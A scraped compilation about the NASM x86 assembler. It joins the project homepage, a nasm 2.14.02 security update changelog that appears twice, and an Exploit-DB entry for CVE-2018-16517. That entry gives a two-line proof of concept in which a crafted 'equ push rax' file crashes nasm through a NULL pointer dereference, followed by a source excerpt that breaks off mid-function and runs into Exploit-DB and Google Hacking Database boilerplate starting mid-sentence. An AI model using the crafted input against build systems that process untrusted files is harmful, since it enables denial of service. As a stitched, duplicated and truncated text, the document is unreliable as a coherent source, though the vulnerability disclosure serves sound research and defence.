## Welcome

This is the project webpage
for the Netwide Assembler (NASM), an assembler for
the x86 CPU architecture portable to nearly every
modern platform, and with code generation for many
platforms old and new.

## License

As of version 2.07, NASM is now under the
[Simplified (2-clause) BSD license](http://opensource.org/licenses/BSD-2-Clause).
The details of the license are available in the documentation.

## Latest version

| Stable | [2.16.03](http://www.nasm.us/pub/nasm/releasebuilds/2.16.03/) | [History](https://nasm.us/doc/nasmdocc.html) |
| --- | --- | --- |
| Builds | [List](http://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D) |  |
| Snapshots | [Latest](http://www.nasm.us/pub/nasm/snapshots/latest/), [List](http://www.nasm.us/pub/nasm/snapshots/?C=M;O=D) |  |

For users of RPM-based Linux distributions (e.g. Fedora, Red Hat, SUSE, ...),
you can download the official NASM builds using `dnf` or `yum`
by installing <nasm.repo> in your `/etc/yum/yum.repos.d`
directory.

## Infrastructure Change

On July 1, 2020, the
official NASM git repository moved to
[github](https://github.com/netwide-assembler/nasm.git).

The previous repository on *repo.or.cz* is no longer maintained.

## Development Team

NASM was originally developed by Simon Tatham and Julian Hall, and is
now maintained by a team led by H. Peter Anvin.

Currently active team members are:

* H. Peter Anvin
* Cyrill Gorcunov
* Chang Seok Bae
* Jim Kukunas
* Frank B. Kotler

... with support from many others, and we are always looking for more developers.

## Your reports aren't going to `/dev/null`

We're looking for your comments, suggestions and, of course, bug-reports.
Report any suspicious behavior you encounter to help us improve the NASM
for everyone!

Please post your messages to the
[mailing list](https://lists.nasm.us/nasm-devel/),
or file a [bug report](http://bugzilla.nasm.us).

Don't worry if your report is not immediately addressed, even within the
first few days, as this is usual for us. Your report will, however, be recorded
and dealt with, of course, as time permits.

©1996-2025 The NASM development team

An update that solves 13 vulnerabilities and has one errata
is now available.
Description:
This update for nasm fixes the following issues:
nasm was updated to version 2.14.02.
This allows building of Mozilla Firefox 78ESR and also contains lots of
bugfixes, security fixes and improvements.
\* Fix crash due to multiple errors or warnings during the code generation
pass if a list file is specified.
\* Create all system-defined macros defore processing command-line given
preprocessing directives (-p, -d, -u, --pragma, --before).
\* If debugging is enabled, define a \_\_DEBUG\_FORMAT\_\_ predefined macro. See
section 4.11.7.
\* Fix an assert for the case in the obj format when a SEG operator refers
to an EXTERN symbol declared further down in the code.
\* Fix a corner case in the floating-point code where a binary, octal or
hexadecimal floating-point having at least 32, 11, or 8 mantissa digits
could produce slightly incorrect results under very specific conditions.
\* Support -MD without a filename, for gcc compatibility. -MF can be used
to set the dependencies output filename. See section 2.1.7.
\* Fix -E in combination with -MD. See section 2.1.21.
\* Fix missing errors on redefined labels; would cause convergence failure
instead which is very slow and not easy to debug.
\* Duplicate definitions of the same label with the same value is now
explicitly permitted (2.14 would allow it in some circumstances.)
\* Add the option --no-line to ignore %line directives in the source. See
section 2.1.33 and section 4.10.1.
\* Changed -I option semantics by adding a trailing path separator
unconditionally.
\* Fixed null dereference in corrupted invalid single line macros.
\* Fixed division by zero which may happen if source code is malformed.
\* Fixed out of bound access in processing of malformed segment override.
\* Fixed out of bound access in certain EQU parsing.
\* Fixed buffer underflow in float parsing.
\* Added SGX (Intel Software Guard Extensions) instructions.
\* Added +n syntax for multiple contiguous registers.
\* Fixed subsections\_via\_symbols for macho object format.
\* Added the --gprefix, --gpostfix, --lprefix, and --lpostfix command line
options, to allow command line base symbol renaming. See section 2.1.28.
\* Allow label renaming to be specified by %pragma in addition to from the
command line. See section 6.9.
\* Supported generic %pragma namespaces, output and debug. See section 6.10.
\* Added the --pragma command line option to inject a %pragma directive.
See section 2.1.29.
\* Added the --before command line option to accept preprocess statement
before input. See section 2.1.30.
\* Added AVX512 VBMI2 (Additional Bit Manipulation), VNNI (Vector Neural
Network), BITALG (Bit Algorithm), and GFNI (Galois Field New
Instruction) instructions.
\* Added the STATIC directive for local symbols that should be renamed
using global-symbol rules. See section 6.8.
\* Allow a symbol to be defined as EXTERN and then later overridden as
GLOBAL or COMMON. Furthermore, a symbol declared EXTERN and then defined
will be treated as GLOBAL. See section 6.5.
\* The GLOBAL directive no longer is required to precede the definition of
the symbol.
\* Support private\_extern as macho specific extension to the GLOBAL
directive. See section 7.8.5.
\* Updated UD0 encoding to match with the specification
\* Added the --limit-X command line option to set execution limits. See
section 2.1.31.
\* Updated the Codeview version number to be aligned with MASM.
\* Added the --keep-all command line option to preserve output files. See
section 2.1.32.
\* Added the --include command line option, an alias to -P (section 2.1.18).
\* Added the --help command line option as an alias to -h (section 3.1).
\* Added -W, -D, and -Q suffix aliases for RET instructions so the operand
sizes of these instructions can be encoded without using o16, o32 or o64.
New upstream version 2.13.03:
\* Add flags: AES, VAES, VPCLMULQDQ
\* Add VPCLMULQDQ instruction
\* elf: Add missing dwarf loc section
\* documentation updates

# Exploit Author: Fakhri Zulkifli
# Vendor Homepage: https://www.nasm.us/
# Software Link: https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D

# CVE : CVE-2018-16517

asm/labels.c in Netwide Assembler (NASM) is prone to NULL Pointer Dereference, which allows the attacker to cause a denial of service via a crafted file.

PoC:
1. echo "equ   push  rax" > poc
2. nasm -f elf poc

insn_is_label remains FALSE and therefore leaving result->label assigned to NULL which is then dereference in islocal().

   [...]

    if (i == TOKEN_ID || (insn_is_label && i == TOKEN_INSN)) {    <-- not taken
        /* there's a label here */
        first = false;
        result->label = tokval.t_charptr;
        i = stdscan(NULL, &tokval);
        if (i == ':') {         /* skip over the optional colon */
            i = stdscan(NULL, &tokval);
        } else if (i == 0) {
            nasm_error(ERR_WARNING | ERR_WARN_OL | ERR_PASS1,
                  "label alone on a line without a colon might be in error");
        }

            /*
             * FIXME: location.segment could be NO_SEG, in which case
             * it is possible we should be passing 'absolute.segment'. Look into this.
             * Work out whether that is *really* what we should be doing.
             * Generally fix things. I think this is right as it is, but
             * am still not certain.
             */
            define_label(result->label,
                         in_absolute ? absolute.segment : location.segment,
                         location.offset, true);
    [...]

static bool islocal(const char *l)
{
    if (tasm_compatible_mode) {
        if (l[0] == '@' && l[1] == '@')

developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

An update that solves 13 vulnerabilities and has one errata
is now available.
Description:
This update for nasm fixes the following issues:
nasm was updated to version 2.14.02.
This allows building of Mozilla Firefox 78ESR and also contains lots of
bugfixes, security fixes and improvements.
\* Fix crash due to multiple errors or warnings during the code generation
pass if a list file is specified.
\* Create all system-defined macros defore processing command-line given
preprocessing directives (-p, -d, -u, --pragma, --before).
\* If debugging is enabled, define a \_\_DEBUG\_FORMAT\_\_ predefined macro. See
section 4.11.7.
\* Fix an assert for the case in the obj format when a SEG operator refers
to an EXTERN symbol declared further down in the code.
\* Fix a corner case in the floating-point code where a binary, octal or
hexadecimal floating-point having at least 32, 11, or 8 mantissa digits
could produce slightly incorrect results under very specific conditions.
\* Support -MD without a filename, for gcc compatibility. -MF can be used
to set the dependencies output filename. See section 2.1.7.
\* Fix -E in combination with -MD. See section 2.1.21.
\* Fix missing errors on redefined labels; would cause convergence failure
instead which is very slow and not easy to debug.
\* Duplicate definitions of the same label with the same value is now
explicitly permitted (2.14 would allow it in some circumstances.)
\* Add the option --no-line to ignore %line directives in the source. See
section 2.1.33 and section 4.10.1.
\* Changed -I option semantics by adding a trailing path separator
unconditionally.
\* Fixed null dereference in corrupted invalid single line macros.
\* Fixed division by zero which may happen if source code is malformed.
\* Fixed out of bound access in processing of malformed segment override.
\* Fixed out of bound access in certain EQU parsing.
\* Fixed buffer underflow in float parsing.
\* Added SGX (Intel Software Guard Extensions) instructions.
\* Added +n syntax for multiple contiguous registers.
\* Fixed subsections\_via\_symbols for macho object format.
\* Added the --gprefix, --gpostfix, --lprefix, and --lpostfix command line
options, to allow command line base symbol renaming. See section 2.1.28.
\* Allow label renaming to be specified by %pragma in addition to from the
command line. See section 6.9.
\* Supported generic %pragma namespaces, output and debug. See section 6.10.
\* Added the --pragma command line option to inject a %pragma directive.
See section 2.1.29.
\* Added the --before command line option to accept preprocess statement
before input. See section 2.1.30.
\* Added AVX512 VBMI2 (Additional Bit Manipulation), VNNI (Vector Neural
Network), BITALG (Bit Algorithm), and GFNI (Galois Field New
Instruction) instructions.
\* Added the STATIC directive for local symbols that should be renamed
using global-symbol rules. See section 6.8.
\* Allow a symbol to be defined as EXTERN and then later overridden as
GLOBAL or COMMON. Furthermore, a symbol declared EXTERN and then defined
will be treated as GLOBAL. See section 6.5.
\* The GLOBAL directive no longer is required to precede the definition of
the symbol.
\* Support private\_extern as macho specific extension to the GLOBAL
directive. See section 7.8.5.
\* Updated UD0 encoding to match with the specification
\* Added the --limit-X command line option to set execution limits. See
section 2.1.31.
\* Updated the Codeview version number to be aligned with MASM.
\* Added the --keep-all command line option to preserve output files. See
section 2.1.32.
\* Added the --include command line option, an alias to -P (section 2.1.18).
\* Added the --help command line option as an alias to -h (section 3.1).
\* Added -W, -D, and -Q suffix aliases for RET instructions so the operand
sizes of these instructions can be encoded without using o16, o32 or o64.
New upstream version 2.13.03:
\* Add flags: AES, VAES, VPCLMULQDQ
\* Add VPCLMULQDQ instruction
\* elf: Add missing dwarf loc section
\* documentation updates
